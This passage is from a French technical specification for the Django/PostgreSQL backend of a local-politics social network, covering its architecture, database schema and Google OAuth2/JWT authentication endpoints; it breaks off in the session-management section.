# Cahier des Spécifications Techniques - Backend Réseau Social Politique (v3)

## 1. Introduction

### 1.1 Contexte du projet

Ce document constitue le cahier des spécifications techniques pour le développement du backend d'un réseau social dédié à la politique locale. La plateforme vise à faciliter les échanges entre citoyens et élus autour de 9 domaines de gouvernance (Culture, Sport, Environnement, Transports, Sécurité, Santé, Emploi, Éducation, Numérique).

Le projet s'inscrit dans une démarche de démocratie participative et doit garantir un haut niveau de sécurité, de confidentialité et de traçabilité des interactions.

### 1.2 Objectifs

- Fournir une API REST complète et sécurisée pour le frontend
- Permettre aux utilisateurs de publier des posts, commenter, échanger en messagerie privée
- Organiser les discussions autour de domaines politiques, forums et sous-forums
- Gérer les relations sociales (followers, abonnements)
- Assurer la modération et la protection contre les abus
- Garantir la confidentialité des données et la séparation avec le système de vote

### 1.3 Périmètre

**Inclus dans ce projet :**
- API REST complète (authentification, utilisateurs, posts, commentaires, likes, messages, forums, etc.)
- Authentification Google OAuth2 avec gestion de tokens JWT
- Base de données PostgreSQL avec schéma relationnel complet
- Système de modération (signalement, bannissement)
- Chiffrement end-to-end pour la messagerie privée
- Rate limiting et protection contre les abus
- Déploiement Docker (docker-compose)

**Exclu de ce projet (TODO futur) :**
- Gestion des médias (images/vidéos) dans les posts - endpoints spécifiés mais non implémentés
- Système de réputation/progression pour nouveaux comptes
- Notifications push en temps réel (WebSockets)

### 1.4 Technologies retenues

| Composant | Technologie | Justification |
|-----------|-------------|---------------|
| **Framework Backend** | Django 5.x + Django REST Framework | Framework mature, sécurisé, excellente documentation |
| **Base de données** | PostgreSQL 16+ | Relations complexes, intégrité référentielle, ACID |
| **Cache & Rate Limiting** | Redis 7+ | Performance, gestion des sessions, rate limiting distribué |
| **Authentification** | Google OAuth2 + JWT | Standard industriel, sécurisé, expérience utilisateur fluide |
| **Conteneurisation** | Docker + Docker Compose | Déploiement simplifié, isolation, reproductibilité |
| **Chiffrement** | AES-256 (E2E), RSA-2048 (clés) | Standards de sécurité actuels |
| **Gestion des dépendances** | uv | Gestionnaire de dépendances Python moderne et rapide |

---

## 2. Architecture Technique

### 2.1 Vue d'ensemble

L'architecture suit les principes de **Clean Architecture** avec une séparation claire des responsabilités :

```
┌─────────────────────────────────────────────────────────────┐
│                         Frontend                             │
│                    (React/Vue/Angular)                       │
└────────────────────────┬────────────────────────────────────┘
                         │ HTTPS (Reverse Proxy)
                         ▼
┌─────────────────────────────────────────────────────────────┐
│                      API REST (Django)                       │
│  ┌──────────┬──────────┬──────────┬──────────┬──────────┐  │
│  │  Apps    │ Services │   DTO    │  Common  │   Auth   │  │
│  │ (Views)  │ (Logic)  │(Transfer)│  (Utils) │ (OAuth2) │  │
│  └──────────┴──────────┴──────────┴──────────┴──────────┘  │
│  ┌──────────────────────────────────────────────────────┐  │
│  │              Domains (Business Models)                │  │
│  └──────────────────────────────────────────────────────┘  │
│  ┌──────────────────────────────────────────────────────┐  │
│  │         DB Layer (Entities + Repositories)            │  │
│  └──────────────────────────────────────────────────────┘  │
└────────────────────────┬────────────────────────────────────┘
                         │
         ┌───────────────┼───────────────┐
         ▼               ▼               ▼
    PostgreSQL        Redis          MinIO (TODO)
   (Données)      (Cache/RL)        (Médias)
```

### 2.2 Stack technique détaillée

**Backend :**
- Python 3.12+
- Django 5.x
- Django REST Framework 3.14+
- djangorestframework-simplejwt (JWT)
- django-cors-headers (CORS)
- django-ratelimit (Rate limiting)
- psycopg3 (PostgreSQL driver)
- redis-py (Redis client)
- cryptography (chiffrement E2E)
- bleach (sanitisation HTML)
- python-jose (JWT)
- requests-oauthlib (OAuth2)

**Infrastructure :**
- PostgreSQL 16+
- Redis 7+
- Docker + Docker Compose
- Nginx/Traefik (reverse proxy HTTPS - infrastructure)

**Outils de développement :**
- uv (gestionnaire de dépendances)
- pytest (tests)
- black (formatage)
- flake8 (linting)
- mypy (type checking)

### 2.3 Structure du projet

```plaintext
demperm/src/serveur/social/
│
├── .gitignore
├── .python-version
├── pyproject.toml
├── uv.lock
├── Dockerfile
├── docker-compose.yml
├── .env.example
├── README.md
│
└── api/
    ├── manage.py
    ├── __init__.py
    │
    ├── apps/                      # Applications Django (endpoints)
    │   ├── auth/
    │   │   ├── urls.py
    │   │   ├── views.py
    │   │   └── __init__.py
    │   ├── users/
    │   ├── posts/
    │   ├── comments/              # NOUVEAU
    │   ├── likes/                 # NOUVEAU
    │   ├── followers/
    │   ├── forums/
    │   ├── domains/               # NOUVEAU
    │   ├── subforums/
    │   ├── subscriptions/
    │   ├── tags/
    │   ├── messages/
    │   ├── reports/               # NOUVEAU
    │   ├── admin_panel/           # NOUVEAU
    │   └── media/                 # NOUVEAU (TODO)
    │

    ├── django/                    # Configuration Django
    │   └── settings.py
    │
    ├── conf/                      # Configuration serveur
    │   ├── asgi.py
    │   ├── urls.py
    │   ├── wsgi.py
    │   └── __init__.py
    │
    ├── domains/                   # Modèles métier (Business Logic)
    │   ├── models/
    │   │   ├── user.py
    │   │   ├── post.py
    │   │   ├── comment.py
    │   │   ├── forum.py
    │   │   ├── domain.py
    │   │   ├── message.py
    │   │   └── ...
    │   └── __init__.py
    │
    ├── db/                        # Couche de persistance
    │   ├── entities/              # Modèles Django ORM
    │   │   ├── user_entity.py
    │   │   ├── post_entity.py
    │   │   ├── comment_entity.py
    │   │   └── ...
    │   ├── repositories/          # Accès aux données
    │   │   ├── user_repository.py
    │   │   ├── post_repository.py
    │   │   └── ...
    │   ├── migrations/
    │   └── __init__.py
    │
    ├── services/                  # Services métier
    │   ├── apps_services/
    │   │   ├── user_service.py
    │   │   ├── post_service.py
    │   │   ├── auth_service.py
    │   │   ├── encryption_service.py  # NOUVEAU (E2E)
    │   │   └── ...
    │   ├── mappers/               # Conversion DTO ↔ Domain
    │   │   ├── user_mapper.py
    │   │   ├── post_mapper.py
    │   │   └── ...
    │   └── __init__.py
    │
    ├── dto/                       # Data Transfer Objects
    │   ├── user_dto.py
    │   ├── post_dto.py
    │   ├── comment_dto.py
    │   └── ...
    │
    ├── common/                    # Utilitaires communs
    │   ├── utils.py
    │   ├── permissions.py
    │   ├── validators.py          # NOUVEAU
    │   ├── rate_limiters.py       # NOUVEAU
    │   ├── exceptions.py
    │   └── __init__.py
    │
    └── tests/                     # Tests
        ├── unit/
        ├── integration/
        └── security/              # NOUVEAU
```

### 2.4 Séparation des couches

#### **Apps (Couche Présentation)**
- Gère les requêtes HTTP entrantes
- Validation des données d'entrée (serializers)
- Appelle les services métier
- Retourne les réponses HTTP (DTO)
- **Responsabilité :** Exposition de l'API REST

#### **Services (Couche Logique Métier)**
- Implémente la logique métier
- Orchestre les opérations complexes
- Gère les transactions
- Appelle les repositories
- **Responsabilité :** Business logic, orchestration

#### **Domains (Couche Domaine)**
- Modèles métier purs (sans dépendance à Django)
- Règles métier
- Validations métier
- **Responsabilité :** Représentation du domaine métier

#### **DB (Couche Persistance)**
- Entités Django ORM
- Repositories pour l'accès aux données
- Migrations
- **Responsabilité :** Accès et persistance des données

#### **DTO (Couche Transfert)**
- Objets de transfert entre couches
- Sérialisation/désérialisation
- **Responsabilité :** Format d'échange de données

#### **Common (Couche Transverse)**
- Permissions
- Validateurs
- Rate limiters
- Utilitaires
- **Responsabilité :** Fonctionnalités partagées

---

## 3. Modèle de Données (PostgreSQL)

### 3.1 Schéma relationnel complet

```mermaid
---
config:
  layout: elk
---
erDiagram
    Users {
        uuid user_id PK
        string google_id UK
        string email UK
        string username UK
        boolean is_admin
        boolean is_banned
        timestamp created_at
        timestamp last_login_at
    }

    UserProfiles {
        uuid profile_id PK
        uuid user_id FK
        string display_name
        string profile_picture_url
        text bio
        string location
        string privacy
        timestamp created_at
        timestamp updated_at
    }

    UserSettings {
        uuid settings_id PK
        uuid user_id FK
        boolean email_notifications
        string language
        timestamp updated_at
    }

    Blocks {
        uuid block_id PK
        uuid blocker_id FK
        uuid blocked_id FK
        timestamp created_at
    }

    Follows {
        uuid follow_id PK
        uuid follower_id FK
        uuid following_id FK
        string status
        timestamp created_at
    }

    Domains {
        uuid domain_id PK
        string domain_name UK
        text description
        string icon_url
        int subforum_count
        timestamp created_at
    }

    Forums {
        uuid forum_id PK
        uuid creator_id FK
        string forum_name UK
        text description
        string forum_image_url
        int member_count
        int post_count
        timestamp created_at
        timestamp updated_at
    }

    Subforums {
        uuid subforum_id PK
        uuid parent_id FK
        uuid creator_id FK
        string subforum_name
        text description
        int post_count
        timestamp created_at
    }


    Memberships {
        uuid membership_id PK
        uuid user_id FK
        uuid forum_id FK
        string role
        timestamp joined_at
    }

    Posts {
        uuid post_id PK
        uuid user_id FK
        uuid subforum_id FK
        string title
        text content
        string content_signature
        int like_count
        int comment_count
        timestamp created_at
        timestamp updated_at
    }

    PostMedia {
        uuid media_id PK
        uuid post_id FK
        string media_type
        string media_url
        int display_order
        timestamp created_at
    }

    Comments {
        uuid comment_id PK
        uuid user_id FK
        uuid post_id FK
        uuid parent_comment_id FK
        text content
        timestamp created_at
        timestamp updated_at
    }

    Likes {
        uuid like_id PK
        uuid user_id FK
        uuid post_id FK
        timestamp created_at
    }

    Tags {
        uuid tag_id PK
        string tag_name UK
        uuid creator_id FK
        timestamp created_at
    }

    PostTags {
        uuid post_tag_id PK
        uuid post_id FK
        uuid tag_id FK
    }

    ForumTags {
        uuid forum_tag_id PK
        uuid forum_id FK
        uuid tag_id FK
    }

    Messages {
        uuid message_id PK
        uuid sender_id FK
        uuid receiver_id FK
        text encrypted_content
        string encryption_key_sender
        string encryption_key_receiver
        boolean is_read
        timestamp created_at
    }

    Reports {
        uuid report_id PK
        uuid reporter_id FK
        string target_type
        uuid target_id
        string reason
        text description
        string status
        uuid resolved_by FK
        timestamp created_at
        timestamp resolved_at
    }

    AuditLogs {
        uuid log_id PK
        uuid user_id FK
        string action_type
        string resource_type
        uuid resource_id
        text details
        string ip_address
        timestamp created_at
    }

    Users ||--|| UserProfiles : "has"
    Users ||--|| UserSettings : "has"
    Users ||--o{ Blocks : "blocks"
    Users ||--o{ Blocks : "blocked_by"
    Users ||--o{ Follows : "following"
    Users ||--o{ Follows : "followed_by"
    Users ||--o{ Forums : "creates"
    Users ||--o{ Subforums : "creates"
    Users ||--o{ Memberships : "joins"
    Users ||--o{ Posts : "creates"
    Users ||--o{ Comments : "writes"
    Users ||--o{ Likes : "gives"
    Users ||--o{ Tags : "creates"
    Users ||--o{ Messages : "sends"
    Users ||--o{ Messages : "receives"
    Users ||--o{ Reports : "reports"
    Users ||--o{ Reports : "resolves"
    Users ||--o{ AuditLogs : "performs"

    Domains ||--o{ Subforums : "contains"
    Forums ||--o{ Subforums : "parent_of"
    Forums ||--o{ Memberships : "has_members"
    Forums ||--o{ ForumTags : "tagged_with"
    Forums ||--o{ Posts : "contains"

    Subforums ||--o{ Posts : "contains"

    Posts ||--o{ PostMedia : "contains"
    Posts ||--o{ PostTags : "tagged_with"
    Posts ||--o{ Comments : "has"
    Posts ||--o{ Likes : "receives"

    Comments ||--o{ Comments : "replies_to"

    Tags ||--o{ PostTags : "tags"
    Tags ||--o{ ForumTags : "tags"
```

### 3.2 Description détaillée des tables

#### **Users**
Table principale des utilisateurs.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| user_id | UUID | PK | Identifiant unique |
| google_id | VARCHAR(255) | UNIQUE, NOT NULL | ID Google OAuth2 |
| email | VARCHAR(255) | UNIQUE, NOT NULL | Email de l'utilisateur |
| username | VARCHAR(50) | UNIQUE, NOT NULL | Nom d'utilisateur |
| is_admin | BOOLEAN | DEFAULT FALSE | Rôle administrateur |
| is_banned | BOOLEAN | DEFAULT FALSE | Utilisateur banni |
| created_at | TIMESTAMP | NOT NULL | Date de création |
| last_login_at | TIMESTAMP | NULL | Dernière connexion |

**Index :**
- `idx_users_email` sur `email`
- `idx_users_google_id` sur `google_id`
- `idx_users_username` sur `username`

**Contraintes :**
- `username` : regex `^[a-zA-Z0-9_-]{3,50}$`
- `email` : format email valide


#### **UserProfiles**
Informations de profil utilisateur.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| profile_id | UUID | PK | Identifiant unique |
| user_id | UUID | FK → Users, UNIQUE | Référence utilisateur |
| display_name | VARCHAR(100) | NULL | Nom d'affichage |
| profile_picture_url | VARCHAR(500) | NULL | URL photo de profil |
| bio | TEXT | NULL, MAX 500 chars | Biographie |
| location | VARCHAR(100) | NULL | Localisation |
| privacy | VARCHAR(20) | NOT NULL, DEFAULT 'public' | Niveau de confidentialité |
| created_at | TIMESTAMP | NOT NULL | Date de création |
| updated_at | TIMESTAMP | NOT NULL | Dernière modification |

**Valeurs possibles pour `privacy` :**
- `private` : Profil visible dans recherches, posts visibles par followers uniquement
- `public` : Profil et posts visibles par tous

**Index :**
- `idx_userprofiles_user_id` sur `user_id`

#### **UserSettings**
Paramètres utilisateur.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| settings_id | UUID | PK | Identifiant unique |
| user_id | UUID | FK → Users, UNIQUE | Référence utilisateur |
| email_notifications | BOOLEAN | DEFAULT TRUE | Notifications email |
| language | VARCHAR(10) | DEFAULT 'fr' | Langue (fr, en) |
| updated_at | TIMESTAMP | NOT NULL | Dernière modification |

#### **Blocks**
Blocages d'utilisateurs.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| block_id | UUID | PK | Identifiant unique |
| blocker_id | UUID | FK → Users | Utilisateur qui bloque |
| blocked_id | UUID | FK → Users | Utilisateur bloqué |
| created_at | TIMESTAMP | NOT NULL | Date du blocage |

**Contraintes :**
- UNIQUE(blocker_id, blocked_id)
- CHECK(blocker_id != blocked_id)

**Index :**
- `idx_blocks_blocker` sur `blocker_id`
- `idx_blocks_blocked` sur `blocked_id`

#### **Follows**
Relations de suivi entre utilisateurs.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| follow_id | UUID | PK | Identifiant unique |
| follower_id | UUID | FK → Users | Utilisateur qui suit |
| following_id | UUID | FK → Users | Utilisateur suivi |
| status | VARCHAR(20) | NOT NULL | Statut de la demande |
| created_at | TIMESTAMP | NOT NULL | Date de la demande |

**Valeurs possibles pour `status` :**
- `pending` : Demande en attente (profil private)
- `accepted` : Demande acceptée
- `rejected` : Demande refusée (soft delete)

**Contraintes :**
- UNIQUE(follower_id, following_id)
- CHECK(follower_id != following_id)

**Index :**
- `idx_follows_follower` sur `follower_id`
- `idx_follows_following` sur `following_id`
- `idx_follows_status` sur `status`

#### **Domains**
Les 9 domaines politiques fixes.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| domain_id | UUID | PK | Identifiant unique |
| domain_name | VARCHAR(100) | UNIQUE, NOT NULL | Nom du domaine |
| description | TEXT | NULL | Description |
| icon_url | VARCHAR(500) | NULL | URL de l'icône |
| subforum_count | INTEGER | DEFAULT 0 | Nombre de sous-forums |
| created_at | TIMESTAMP | NOT NULL | Date de création |

**Domaines pré-créés :**
1. Culture
2. Sport
3. Environnement
4. Transports
5. Sécurité
6. Santé
7. Emploi
8. Éducation
9. Numérique

**Index :**
- `idx_domains_name` sur `domain_name`

#### **Forums**
Forums créés par les utilisateurs.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| forum_id | UUID | PK | Identifiant unique |
| creator_id | UUID | FK → Users | Créateur du forum |
| forum_name | VARCHAR(200) | UNIQUE, NOT NULL | Nom du forum |
| description | TEXT | NULL, MAX 1000 chars | Description |
| forum_image_url | VARCHAR(500) | NULL | URL image du forum |
| member_count | INTEGER | DEFAULT 0 | Nombre de membres |
| post_count | INTEGER | DEFAULT 0 | Nombre de posts |
| created_at | TIMESTAMP | NOT NULL | Date de création |
| updated_at | TIMESTAMP | NOT NULL | Dernière modification |

**Contraintes :**
- `forum_name` : minLength 3, maxLength 200

**Index :**
- `idx_forums_creator` sur `creator_id`
- `idx_forums_name` sur `forum_name`
- `idx_forums_created_at` sur `created_at`

#### **Subforums**
Sous-forums (peuvent appartenir à un Domain ou un Forum).

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| subforum_id | UUID | PK | Identifiant unique |
| parent_id | UUID | FK → Domains OR Forums | Parent (domain ou forum) |
| creator_id | UUID | FK → Users | Créateur |
| subforum_name | VARCHAR(200) | NOT NULL | Nom du sous-forum |
| description | TEXT | NULL, MAX 1000 chars | Description |
| post_count | INTEGER | DEFAULT 0 | Nombre de posts |
| created_at | TIMESTAMP | NOT NULL | Date de création |

**Note :** `parent_id` peut référencer soit un Domain, soit un Forum (polymorphisme géré en applicatif).

**Index :**
- `idx_subforums_parent` sur `parent_id`
- `idx_subforums_creator` sur `creator_id`


#### **Memberships**
Abonnements aux forums.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| membership_id | UUID | PK | Identifiant unique |
| user_id | UUID | FK → Users | Utilisateur |
| forum_id | UUID | FK → Forums | Forum |
| role | VARCHAR(20) | DEFAULT 'member' | Rôle (member, moderator) |
| joined_at | TIMESTAMP | NOT NULL | Date d'adhésion |

**Contraintes :**
- UNIQUE(user_id, forum_id)

**Index :**
- `idx_memberships_user` sur `user_id`
- `idx_memberships_forum` sur `forum_id`

#### **Posts**
Publications des utilisateurs.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| post_id | UUID | PK | Identifiant unique |
| user_id | UUID | FK → Users | Auteur |
| subforum_id | UUID | FK → Subforums, NULL | Sous-forum (optionnel) |
| title | VARCHAR(200) | NOT NULL | Titre du post |
| content | TEXT | NOT NULL, MAX 10000 chars | Contenu |
| content_signature | VARCHAR(512) | NULL | Signature HMAC-SHA256 |
| like_count | INTEGER | DEFAULT 0 | Nombre de likes |
| comment_count | INTEGER | DEFAULT 0 | Nombre de commentaires |
| created_at | TIMESTAMP | NOT NULL | Date de création |
| updated_at | TIMESTAMP | NOT NULL | Dernière modification |

**Contraintes :**
- `title` : minLength 1, maxLength 200, regex `^[a-zA-Z0-9 .,!?'À-ÿ-]+$`
- `content` : minLength 1, maxLength 10000

**Index :**
- `idx_posts_user` sur `user_id`
- `idx_posts_subforum` sur `subforum_id`
- `idx_posts_created_at` sur `created_at` DESC

#### **PostMedia (TODO - NE PAS IMPLÉMENTER)**
Médias attachés aux posts.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| media_id | UUID | PK | Identifiant unique |
| post_id | UUID | FK → Posts | Post parent |
| media_type | VARCHAR(20) | NOT NULL | Type (image, video) |
| media_url | VARCHAR(500) | NOT NULL | URL du média |
| display_order | INTEGER | DEFAULT 0 | Ordre d'affichage |
| created_at | TIMESTAMP | NOT NULL | Date d'upload |

**Contraintes :**
- `media_type` : IN ('image', 'video')
- Max 4 médias par post

**Note :** Cette table est spécifiée pour référence future mais **NE DOIT PAS être implémentée** dans cette version.

#### **Comments**
Commentaires sur les posts.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| comment_id | UUID | PK | Identifiant unique |
| user_id | UUID | FK → Users | Auteur |
| post_id | UUID | FK → Posts | Post commenté |
| parent_comment_id | UUID | FK → Comments, NULL | Commentaire parent (réponse) |
| content | TEXT | NOT NULL, MAX 2000 chars | Contenu |
| created_at | TIMESTAMP | NOT NULL | Date de création |
| updated_at | TIMESTAMP | NOT NULL | Dernière modification |

**Contraintes :**
- `content` : minLength 1, maxLength 2000

**Index :**
- `idx_comments_post` sur `post_id`
- `idx_comments_user` sur `user_id`
- `idx_comments_parent` sur `parent_comment_id`
- `idx_comments_created_at` sur `created_at` DESC

#### **Likes**
Likes sur les posts.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| like_id | UUID | PK | Identifiant unique |
| user_id | UUID | FK → Users | Utilisateur |
| post_id | UUID | FK → Posts | Post liké |
| created_at | TIMESTAMP | NOT NULL | Date du like |

**Contraintes :**
- UNIQUE(user_id, post_id)

**Index :**
- `idx_likes_user` sur `user_id`
- `idx_likes_post` sur `post_id`

#### **Tags**
Tags pour catégoriser posts et forums.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| tag_id | UUID | PK | Identifiant unique |
| tag_name | VARCHAR(50) | UNIQUE, NOT NULL | Nom du tag |
| creator_id | UUID | FK → Users | Créateur |
| created_at | TIMESTAMP | NOT NULL | Date de création |

**Contraintes :**
- `tag_name` : minLength 2, maxLength 50, regex `^[a-zA-Z0-9_-]+$`

**Index :**
- `idx_tags_name` sur `tag_name`

#### **PostTags & ForumTags**
Tables de jointure pour tags.

**PostTags :**
- post_tag_id (UUID, PK)
- post_id (UUID, FK → Posts)
- tag_id (UUID, FK → Tags)
- UNIQUE(post_id, tag_id)

**ForumTags :**
- forum_tag_id (UUID, PK)
- forum_id (UUID, FK → Forums)
- tag_id (UUID, FK → Tags)
- UNIQUE(forum_id, tag_id)

#### **Messages**
Messagerie privée avec chiffrement E2E.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| message_id | UUID | PK | Identifiant unique |
| sender_id | UUID | FK → Users | Expéditeur |
| receiver_id | UUID | FK → Users | Destinataire |
| encrypted_content | TEXT | NOT NULL | Contenu chiffré (AES-256) |
| encryption_key_sender | VARCHAR(512) | NOT NULL | Clé chiffrée pour l'expéditeur |
| encryption_key_receiver | VARCHAR(512) | NOT NULL | Clé chiffrée pour le destinataire |
| is_read | BOOLEAN | DEFAULT FALSE | Message lu |
| created_at | TIMESTAMP | NOT NULL | Date d'envoi |

**Contraintes :**
- CHECK(sender_id != receiver_id)

**Index :**
- `idx_messages_sender` sur `sender_id`
- `idx_messages_receiver` sur `receiver_id`
- `idx_messages_created_at` sur `created_at` DESC

**Note :** Le chiffrement E2E est détaillé en section 6.7.

#### **Reports**
Signalements de contenu.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| report_id | UUID | PK | Identifiant unique |
| reporter_id | UUID | FK → Users | Utilisateur signalant |
| target_type | VARCHAR(20) | NOT NULL | Type de cible |
| target_id | UUID | NOT NULL | ID de la cible |
| reason | VARCHAR(50) | NOT NULL | Raison du signalement |
| description | TEXT | NULL, MAX 500 chars | Description détaillée |
| status | VARCHAR(20) | DEFAULT 'pending' | Statut |
| resolved_by | UUID | FK → Users, NULL | Admin ayant résolu |
| created_at | TIMESTAMP | NOT NULL | Date du signalement |
| resolved_at | TIMESTAMP | NULL | Date de résolution |

**Valeurs possibles :**
- `target_type` : 'post', 'comment', 'user'
- `reason` : 'spam', 'harassment', 'inappropriate', 'misinformation', 'other'
- `status` : 'pending', 'resolved', 'rejected'

**Index :**
- `idx_reports_reporter` sur `reporter_id`
- `idx_reports_status` sur `status`
- `idx_reports_target` sur `(target_type, target_id)`


#### **AuditLogs**
Journalisation des actions pour traçabilité.

| Colonne | Type | Contraintes | Description |
|---------|------|-------------|-------------|
| log_id | UUID | PK | Identifiant unique |
| user_id | UUID | FK → Users, NULL | Utilisateur (NULL si système) |
| action_type | VARCHAR(50) | NOT NULL | Type d'action |
| resource_type | VARCHAR(50) | NOT NULL | Type de ressource |
| resource_id | UUID | NULL | ID de la ressource |
| details | TEXT | NULL | Détails JSON |
| ip_address | VARCHAR(45) | NULL | Adresse IP |
| created_at | TIMESTAMP | NOT NULL | Date de l'action |

**Valeurs possibles pour `action_type` :**
- 'create', 'update', 'delete', 'login', 'logout', 'ban', 'unban', 'report', 'resolve_report'

**Index :**
- `idx_auditlogs_user` sur `user_id`
- `idx_auditlogs_action` sur `action_type`
- `idx_auditlogs_created_at` sur `created_at` DESC

### 3.3 Contraintes et index globaux

**Contraintes de suppression (ON DELETE) :**
- Users → UserProfiles : CASCADE
- Users → UserSettings : CASCADE
- Users → Posts : SET NULL (garder les posts orphelins pour historique)
- Users → Comments : SET NULL
- Users → Blocks : CASCADE
- Users → Follows : CASCADE
- Posts → Comments : CASCADE
- Posts → Likes : CASCADE
- Posts → PostMedia : CASCADE

**Index de performance :**
- Index composites pour les requêtes fréquentes :
  - `idx_posts_subforum_created` sur `(subforum_id, created_at DESC)`
  - `idx_comments_post_created` sur `(post_id, created_at DESC)`
  - `idx_follows_follower_status` sur `(follower_id, status)`

### 3.4 Justification du choix PostgreSQL

**Pourquoi PostgreSQL pour ce projet ?**

1. **Relations complexes** : Forums, subforums, posts, comments, likes nécessitent des jointures SQL
2. **Intégrité référentielle** : Foreign keys, contraintes, transactions ACID
3. **Performances** : Index B-tree, requêtes complexes optimisées
4. **Maturité** : Écosystème Django mature (ORM, migrations)
5. **Scalabilité** : Partitionnement, réplication, extensions (PostGIS si géolocalisation future)

**Alternatives considérées :**
- MongoDB : Moins adapté aux relations complexes
- MySQL : Moins de fonctionnalités avancées (JSON, full-text search)

**Décision** : PostgreSQL 16+ retenu pour sa robustesse et son adéquation au modèle relationnel.

---

## 4. Authentification et Autorisation

### 4.1 Authentification Google OAuth2

**⚠️ IMPORTANT : Authentification 100% Google OAuth2**

- Pas de système de login/password local
- Pas de stockage de mots de passe
- Pas de hachage nécessaire (Argon2 non utilisé)
- Tous les utilisateurs s'authentifient via Google

**Si authentification locale ajoutée à l'avenir :**
- Utiliser Argon2id pour le hachage
- Implémenter la validation de force de mot de passe
- Ajouter la réinitialisation par email

#### 4.1.1 Flux d'authentification

```mermaid
sequenceDiagram
    participant F as Frontend
    participant B as Backend API
    participant G as Google OAuth2
    participant DB as PostgreSQL

    F->>B: GET /auth/google/login
    B->>F: Redirect URL vers Google
    F->>G: Redirection utilisateur
    G->>G: Utilisateur s'authentifie
    G->>F: Callback avec code
    F->>B: POST /auth/google/callback {code}
    B->>G: Exchange code for tokens
    G->>B: {access_token, id_token, user_info}
    B->>DB: Vérifier/Créer utilisateur
    DB->>B: User data
    B->>B: Générer JWT (access + refresh)
    B->>F: {access_token, refresh_token, user}
    F->>F: Stocker tokens (localStorage/cookie)

    Note over F,B: Requêtes authentifiées
    F->>B: GET /users/me (Header: Authorization: Bearer {access_token})
    B->>B: Valider JWT
    B->>F: User data
```


#### 4.1.2 Endpoints d'authentification

**GET /api/v1/auth/google/login**

Initie le flux OAuth2 avec Google.

**Requête :**
```http
GET /api/v1/auth/google/login HTTP/1.1
Host: api.example.com
```

**Réponse (200 OK) :**
```json
{
  "authorization_url": "https://accounts.google.com/o/oauth2/v2/auth?client_id=...&redirect_uri=...&scope=openid%20email%20profile&state=..."
}
```

**Comportement :**
1. Génère un `state` aléatoire (protection CSRF)
2. Stocke le `state` en session Redis (TTL 10 min)
3. Construit l'URL d'autorisation Google
4. Retourne l'URL au frontend

---

**POST /api/v1/auth/google/callback**

Échange le code d'autorisation contre des tokens.

**Requête :**
```http
POST /api/v1/auth/google/callback HTTP/1.1
Content-Type: application/json

{
  "code": "4/0AY0e-g7...",
  "state": "random_state_value"
}
```

**Réponse (200 OK) - Utilisateur existant :**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "user": {
    "user_id": "550e8400-e29b-41d4-a716-446655440000",
    "username": "john_doe",
    "email": "john@example.com",
    "is_admin": false,
    "profile": {
      "display_name": "John Doe",
      "profile_picture_url": "https://...",
      "privacy": "public"
    }
  }
}
```

**Réponse (201 Created) - Nouvel utilisateur :**
Même structure, mais l'utilisateur est créé automatiquement.

**Erreurs :**
- `400 Bad Request` : Code ou state invalide
- `401 Unauthorized` : Échec de l'authentification Google
- `403 Forbidden` : Utilisateur banni

**Comportement :**
1. Valider le `state` (protection CSRF)
2. Échanger le `code` contre un `access_token` Google
3. Récupérer les infos utilisateur depuis Google (`id_token` ou `/userinfo`)
4. Vérifier si l'utilisateur existe (via `google_id`)
5. Si nouveau : créer User + UserProfile + UserSettings
6. Si existant : mettre à jour `last_login_at`
7. Générer JWT access_token (TTL 1h) et refresh_token (TTL 7j)
8. Stocker refresh_token en Redis
9. Logger l'action dans AuditLogs
10. Retourner les tokens + user data

---

**POST /api/v1/auth/refresh**

Renouvelle l'access token avec un refresh token.

**Requête :**
```http
POST /api/v1/auth/refresh HTTP/1.1
Content-Type: application/json

{
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

**Réponse (200 OK) :**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

**Erreurs :**
- `401 Unauthorized` : Refresh token invalide ou expiré

---

**POST /api/v1/auth/logout**

Déconnecte l'utilisateur (invalide le refresh token).

**Requête :**
```http
POST /api/v1/auth/logout HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

**Réponse (204 No Content)**

**Comportement :**
1. Supprimer le refresh_token de Redis
2. Logger l'action dans AuditLogs

#### 4.1.3 Structure des JWT

**Access Token (TTL : 1 heure) :**
```json
{
  "token_type": "access",
  "user_id": "550e8400-e29b-41d4-a716-446655440000",
  "username": "john_doe",
  "is_admin": false,
  "exp": 1700000000,
  "iat": 1699996400,
  "jti": "unique-token-id"
}
```

**Refresh Token (TTL : 7 jours) :**
```json
{
  "token_type": "refresh",
  "user_id": "550e8400-e29b-41d4-a716-446655440000",
  "exp": 1700604800,
  "iat": 1699996400,
  "jti": "unique-refresh-id"
}
```

**Algorithme :** HS256 (HMAC-SHA256)
**Secret :** Stocké dans variable d'environnement `JWT_SECRET_KEY`

### 4.2 Gestion des sessions

**Stockage des refresh tokens :**
- Redis avec clé : `refresh_token:{user_id}:{jti}`
- TTL : 7 jours
- Permet la révocation immédiate (logout, ban)

**Validation des access tokens :**
- Vérification de la signature
